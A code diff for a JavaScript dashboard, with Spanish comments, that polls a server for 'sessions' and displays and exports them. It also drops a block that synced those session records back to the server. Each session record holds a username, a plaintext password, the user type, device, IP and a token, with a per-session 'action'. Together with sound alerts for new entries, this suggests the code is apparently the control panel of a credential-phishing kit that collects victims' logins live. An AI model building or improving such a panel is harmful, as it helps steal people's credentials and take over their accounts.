@@ -325,36 +325,20 @@ function render() {
 
 async function pollSessions() {
   try {
-    let response;
-    if (rows.size > 0) {
-      const syncList = [...rows.values()].map((r) => ({
-        id: r.id,
-        index: r.index,
-        username: r.user,
-        password: r.clave,
-        tipoUsuario: r.tipo,
-        device: r.device,
-        ip: r.ip,
-        token: r.token,
-        state: r.state,
-        action: r.action,
-        createdAt: r.createdAt,
-        last_seen: r.last_seen,
-        updatedAt: r.updatedAt
-      }));
-      response = await fetch('/api/sessions/sync', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessions: syncList })
-      });
-    } else {
-      response = await fetch('/api/sessions');
-    }
+    const response = await fetch('/api/sessions');
 
     if (response && response.ok) {
       const list = await response.json();
       
-      // Track existing new entries BEFORE clearing the map
+      // Limpiar sesiones locales que ya no existen en el servidor (ej. al pulsar Limpiar)
+      const serverIds = new Set(list.map((s) => s.id));
+      for (const id of rows.keys()) {
+        if (!serverIds.has(id)) {
+          rows.delete(id);
+        }
+      }
+
+      // Track existing new entries BEFORE updating the map
       const oldKeys = new Set(rows.keys());
       let hasNewOrChangedSession = false;
       
@@ -389,7 +373,7 @@ async function pollSessions() {
         }
       });
 
-      // Actualizar o añadir sesiones sin borrar las existentes para evitar parpadeos
+      // Actualizar o añadir sesiones
       list.forEach((session) => {
         const existing = rows.get(session.id);
         const resolvedState = session.state || (existing ? existing.state : 'waiting');
@@ -538,13 +522,14 @@ function playErrorSound() {
 }
 
 btnClean?.addEventListener('click', async () => {
-  rows.clear()
+  rows.clear();
+  render();
   try {
     await fetch('/api/clear', { method: 'POST' });
   } catch (_) {}
-  hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
-  render()
-})
+  hint.textContent = 'Cola limpia. Esperando nuevos usuarios…';
+  render();
+});
 
 function exportToNotepad() {
   const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0));
